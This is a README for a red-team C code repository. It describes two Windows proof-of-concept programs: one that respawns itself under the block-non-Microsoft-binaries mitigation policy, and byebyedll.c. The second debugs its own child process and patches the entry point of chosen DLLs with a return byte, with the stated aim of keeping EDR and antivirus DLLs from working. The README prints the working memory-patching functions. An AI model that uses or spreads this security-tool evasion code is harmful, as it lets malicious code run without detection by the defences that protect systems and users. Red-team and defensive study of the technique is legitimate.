# RedTeamCCode
Red Team C code repo

# PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.c

Is a proof-of-concept for the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` trick it will enforce the policy then spawn itself again the respawned process have the policy enforced allowing you run "malicious" code with the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` been set.

# byebyedll.c

Is a proof-of-concept that enforce the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` policy and also debug the child process (itself) and monitor Dlls that are loaded using Windows debugger APIs. It detect Dlls based on the path and patch it. The idea is to prevent EDR and AV Dlls loaded into your process from executing properly. This is a POC the blacklisted Dlls is set to `user32.dll`.  

The event is monitored using the `LOAD_DLL_DEBUG_EVENT` event. 

The DLL location is then retrieved using `event.u.UnloadDll.lpBaseOfDll`

The code is patched using the following functions:

```
VOID *GetEntryPointOffset(CHAR *start, DWORD dwSize, HANDLE hProc) {

    CHAR* mem = GlobalAlloc(GPTR, dwSize);
    DWORD dwBytesRead = 0;

    ReadProcessMemory(hProc, start, mem, dwSize, &dwBytesRead);

    DWORD dwBaseDLLInitializeOffset = *((DWORD*)mem + (0x120 / 4));

#ifdef DEBUG
    printf("dwBaseDLLInitializeOffset offset 0x%x\n", dwBaseDLLInitializeOffset);
#endif

    VOID *dwBaseDLLInitialize = (VOID*)start + dwBaseDLLInitializeOffset;

#ifdef DEBUG
    printf("dwBaseDLLInitialize offset 0x%p\n", dwBaseDLLInitialize);
#endif

    GlobalFree(mem);
    return dwBaseDLLInitialize;
}

VOID ModifyMem(CHAR *start, DWORD dwSize, HANDLE hProc) {
#ifdef DEBUG
    printf("Cleaning HANDLE 0x%p 0x%p length: %d\n", hProc, start, dwSize);
#endif
    VOID* EntryPoint = GetEntryPointOffset(start, dwSize, hProc);
    DWORD dwOut = 0;
    DWORD dwOld = 0;

#ifdef DEBUG
    printf("EntryPoint at 0x%p\n", EntryPoint);
#endif

    VirtualProtectEx(hProc, EntryPoint, 1, PAGE_READWRITE, &dwOld);
    WriteProcessMemory(hProc, EntryPoint, "\xc3", 1, &dwOut);
#ifdef DEBUG
    printf("Size of bytes written: %d\n", dwOut);
#endif
}
```

Verbose messages can be removed before the code is compiled by setting `DEBUG` as `FALSE`.

# Credit 
Mr.Un1k0d3r RingZer0 Team
